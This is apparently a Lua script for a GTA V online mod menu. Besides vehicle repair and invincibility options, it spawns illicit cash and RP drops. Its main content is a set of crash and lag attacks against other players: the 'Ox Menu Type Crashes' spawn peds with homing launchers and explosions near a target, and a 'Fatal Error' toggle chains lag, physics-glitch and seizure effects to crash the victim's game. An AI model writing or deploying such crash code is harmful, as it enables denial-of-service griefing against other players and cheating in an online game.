	menu.action(frienm,"Repair", {"repair"}, "Repairs player's vehicle. Note: It will lag them a bit if you hold the toggle on", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh On", {"invon"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh Off", {"invoff"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)


    local drops = menu.list(frienm, "Currupt Drops", {}, "")

    menu.toggle_loop(drops, "Drop RP", {"rp"}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
                util.yield(300)
    end)


	menu.action(drops, "Crazy Drops", {"crazydrop"}, "Turns on rp drops, ceopay, snacks and cash all 1 then changes to just ceo pay and cash 3600 after 5 seconds. Then gives them ~175k RP. Can boost a lvl 1 ~25 levels.", function()
		notification("Currupt Drop :)", colors.pink)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
        		menu.trigger_commands("snack".. players.get_name(pid) .. " on")
		util.yield(600)
        		menu.trigger_commands("snack".. players.get_name(pid) .. " off")
		menu.trigger_commands("cash".. players.get_name(pid) .. " 1")
        		menu.trigger_commands("arm".. players.get_name(pid))
        		menu.trigger_commands("ammo".. players.get_name(pid))
        		menu.trigger_commands("paragive".. players.get_name(pid))
		util.yield(5000)
		menu.trigger_commands("cash".. players.get_name(pid) .. " 3600")
        		menu.trigger_commands("rp".. players.get_name(pid) .. " on")
		util.yield(10000)
        		menu.trigger_commands("rp".. players.get_name(pid) .. " off")
		util.yield(1000)
    	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(drops, "Cash 3600 Timer", {"cashon"}, "Turns on ceopay and cash 3600.", function()
		notification("Currupt Drop On :)", colors.green)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
		menu.trigger_commands("cash".. players.get_name(pid) .. " 3600")
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(drops, "Cash Off", {"cashoff"}, "Turns off ceopay and cash 0.", function()
		notification("Currupt Drop On :)", colors.green)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
		menu.trigger_commands("cash".. players.get_name(pid) .. " 0")
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)

	menu.action(menu.player_root(pid), "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)


local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local include_friends = false
menu.toggle(crash, "Exclude friends", {}, "Save friends ass from being crashed if close (Turns off sync to friends using timeout).", function(on)
    include_friends = on
    for k, id in pairs(players.list(false, true, false)) do
        name = players.get_name(id)
        if include_friends then
            menu.trigger_commands("timeout"..name.." on")
        else
            menu.trigger_commands("timeout"..name.." off")
        end
    end
end, false)


local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    	local newcrash = menu.list(crash, "Annoy Modders", {}, "")

        local oxtypecrash = menu.list(crash, "Ox Menu Type Crashes", {}, "From Nightfall")

        
        menu.toggle_loop(oxtypecrash, "All Ox Menu Type Crashes On", {"oxallcrash"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
            if on_toggle then
            util.toast("Get Ready... ;)")
            menu.trigger_commands("poodlecrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("beverlycrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("fabiencrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("manuelcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("wadecrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("shophighcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("franklincrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                            util.yield(100)
            local player_ped = PLAYER.PLAYER_PED_ID()    
            local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
            local pld = PLAYER.GET_PLAYER_PED(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(pld)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2699.9976)
            util.yield(1000)
            for i=1,4  do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2699.9976)
                util.yield(1000)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
            util.yield(10)
        else
            menu.trigger_commands("poodlecrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("beverlycrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("fabiencrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("manuelcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("wadecrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("shophighcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("franklincrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("siemoncrash" .. players.get_name(pid))
            util.yield(10)
            menu.trigger_commands("superc")
            util.yield(10)
            menu.trigger_commands("superc")
            util.toast("Ox Crash Stopped & Cleaned...")
                        end
                  end)

        menu.toggle_loop(oxtypecrash, "Poodle Crash", {"poodlecrash"}, "", function(on_toggle)

        	local mdl = util.joaat('a_c_poodle')
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(100)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0), 0)
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1500)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1000)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
    end)

    menu.toggle_loop(oxtypecrash, "Beverly Crash", {"beverlycrash"}, "", function(on_toggle)

        local mdl = util.joaat('cs_beverly')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 1, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
        else
                util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
        end
end)

    menu.toggle_loop(oxtypecrash, "Fabien Crash", {"fabiencrash"}, "", function(on_toggle)

        local mdl = util.joaat('cs_fabien')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 1), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
        else
                util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
        end
end)

menu.toggle_loop(oxtypecrash, "Manuel Crash", {"manuelcrash"}, "", function(on_toggle)

    local mdl = util.joaat('cs_manuel')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)


menu.toggle_loop(oxtypecrash, "Taostranslator Crash", {"taostranslatorcrash"}, "", function(on_toggle)

    local mdl = util.joaat('cs_taostranslator')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Taostranslator2 Crash", {"taostranslator2crash"}, "", function(on_toggle)

    local mdl = util.joaat('cs_taostranslator2')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Tenniscoach Crash", {"tenniscoachcrash"}, "", function(on_toggle)

    local mdl = util.joaat('cs_tenniscoach')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -1, 0, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Wade Crash", {"wadecrash"}, "", function(on_toggle)

    local mdl = util.joaat('cs_wade')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -1, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Shop HIGH Crash", {"shophighcrash"}, "", function(on_toggle)

    local mdl = util.joaat('S_F_M_Shop_HIGH')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Franklin Crash", {"franklincrash"}, "", function(on_toggle)

    local mdl = util.joaat('P_Franklin_02')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Lazlow Crash", {"lazlowcrash"}, "", function(on_toggle)

    local mdl = util.joaat('CS_Lazlow')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

menu.toggle_loop(oxtypecrash, "Siemon Crash", {"siemoncrash"}, "", function(on_toggle)

    local mdl = util.joaat('IG_SiemonYetarian')
        if request_model(mdl, 2) then
            local pos = players.get_position(pid)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
    else
            util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
    end

end)

--[[

Worked once then stopped working... 

    menu.toggle_loop(crash, "OXMenu's Crash", {"oxcrash"}, "", function(on_toggle)

        local mdl = util.joaat('a_c_poodle')
        local mdl0 = util.joaat('cs_beverly')
        local mdl1 = util.joaat('cs_fabien')
        local mdl2 = util.joaat('cs_manuel')
        local mdl3 = util.joaat('cs_taostranslator')
        local mdl4 = util.joaat('cs_taostranslator2')
        local mdl5 = util.joaat('cs_tenniscoach')
        local mdl6 = util.joaat('cs_wade')
        local mdl7 = util.joaat('S_F_M_Shop_HIGH')
        local mdl8 = util.joaat('P_Franklin_02')
        local mdl9 = util.joaat('CS_Lazlow')
        local mdl10 = util.joaat('IG_SiemonYetarian')
            BlockSyncs(pid, function()
            if request_model(mdl, mdl0, mdl1, mdl2, mdl2, mdl3, mdl5, mdl6, mdl7, mdl8, mdl9, mdl10,   2) then
                local pos = players.get_position(pid)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl0, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl3, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl4, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl5, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl6, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl7, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl8, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl9, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped1 = entities.create_ped(26, mdl10, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
        else
                util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
        endtal
    end)
end)
]]

        menu.toggle(newcrash, "Fatal Error", {"fatal"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash. Hit Stop Fatal Crash, or just restart the script.", function(on)
	if on then
                  util.toast("Get Ready... ;)")
	menu.trigger_commands("panic")
	menu.trigger_commands("badnet" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("glitchphysics" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("oxallcrash" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("poodlev2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("togglefragv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("glitchphysics" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("seizurev3" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxclown" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
                	util.yield(100)
        	menu.trigger_commands("chaosyeet" .. players.get_name(pid))
